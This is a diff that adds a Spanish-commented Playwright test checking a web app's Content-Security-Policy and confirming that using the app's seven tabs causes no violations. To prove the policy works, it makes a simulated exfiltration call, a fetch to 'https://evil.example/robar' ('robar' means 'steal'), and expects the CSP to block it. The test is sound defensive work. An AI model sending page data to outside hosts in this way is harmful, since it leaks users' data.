@@ -178,6 +178,47 @@ ok(fuera.length === 0, 'sin cuenta, el navegador no pide nada a ningún otro sit
 ok(errs.length === 0, 'la pagina no lanzo ningun error', errs.length ? errs.join(' | ') : 'sin pageerror');
 await b.close(); srv.close();
 
+console.log('\n═══ CSP · aunque entrara código ajeno, no puede sacar nada ═══');
+/* La política va en un <meta> porque Pages no deja poner cabeceras. El script
+   de la app es inline, así que script-src lleva 'unsafe-inline': la CSP NO
+   impide que corra código inyectado. Lo que impide es que ese código hable con
+   nadie que no sea el proyecto Supabase (connect-src) o se chive pidiendo una
+   imagen (img-src sólo data: y blob:). Ese es su valor aquí, y no se vende otro. */
+const csp = (html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1] || '';
+const dir = Object.fromEntries(csp.split(';').map(x => x.trim()).filter(Boolean).map(x => { const [k, ...v] = x.split(/\s+/); return [k, v]; }));
+ok(!!csp, 'la página declara una CSP', csp ? csp.length + ' caracteres' : 'no hay <meta> de CSP');
+ok(JSON.stringify(dir['default-src']) === `["'none'"]`, "default-src 'none': todo lo no listado está prohibido", (dir['default-src'] || []).join(' '));
+ok(JSON.stringify(dir['connect-src']) === JSON.stringify([NUBE]), 'connect-src es SOLO el proyecto Supabase', (dir['connect-src'] || []).join(' '));
+ok(JSON.stringify((dir['img-src'] || []).slice().sort()) === JSON.stringify(['blob:', 'data:']), 'img-src sólo data: y blob: — ninguna imagen se pide fuera', (dir['img-src'] || []).join(' '));
+ok(JSON.stringify(dir['base-uri']) === `["'none'"]` && JSON.stringify(dir['form-action']) === `["'none'"]`, "base-uri y form-action 'none'");
+ok(!(dir['script-src'] || []).some(x => /^https?:|\*/.test(x)), 'script-src no admite ningún origen externo', (dir['script-src'] || []).join(' '));
+
+/* Y que la política no rompa la app: las siete pestañas, sin una sola violación. */
+const csrv = createServer((q, r) => { r.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); r.end(html); });
+await new Promise(r => csrv.listen(0, '127.0.0.1', r));
+const cb = await chromium.launch();
+const cctx = await cb.newContext();
+await cctx.addInitScript(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ← ' + (e.blockedURI || 'inline'))); });
+const cp = await cctx.newPage();
+const cerrs = []; cp.on('pageerror', e => cerrs.push(e.message));
+await cp.goto(`http://127.0.0.1:${csrv.address().port}/`, { waitUntil: 'load' });
+await cp.waitForFunction(() => typeof window.FUT !== 'undefined', null, { timeout: 20000 });
+const pestanas = await cp.evaluate(() => [...document.querySelectorAll('.tabbtn[data-tab]')].map(x => x.dataset.tab));
+for (const t of pestanas) { await cp.click(`.tabbtn[data-tab="${t}"]`); await cp.waitForTimeout(250); }
+const viol = await cp.evaluate(() => window.__csp);
+ok(pestanas.length === 7, 'se recorrieron las siete pestañas', pestanas.join(' · '));
+ok(viol.length === 0, 'ninguna violación de CSP usando la app', viol.length ? viol.join(' | ') : 'ninguna');
+ok(cerrs.length === 0, 'y ningún error de página con la política puesta', cerrs.join(' | ') || 'ninguno');
+/* Sin red, ese fetch fallaría igual: lo que se afirma es que lo para la CSP, o
+   sea que deja una violación de connect-src con esa URL. */
+const intento = await cp.evaluate(async () => {
+  try { await fetch('https://evil.example/robar'); } catch (e) { }
+  await new Promise(r => setTimeout(r, 100));
+  return window.__csp.filter(v => /^connect-src/.test(v) && /evil\.example/.test(v));
+});
+ok(intento.length === 1, 'un fetch a otro origen lo bloquea la CSP, no la falta de red', intento.join(' | ') || 'ninguna violación: no lo paró la CSP');
+await cb.close(); csrv.close();
+
 console.log('\n═══ PERMISOS DE GITHUB ACTIONS ═══');
 const wf = n => readFileSync(join(raiz, '.github/workflows', n), 'utf8');
 ['pruebas.yml', 'pagina.yml'].forEach(n => {
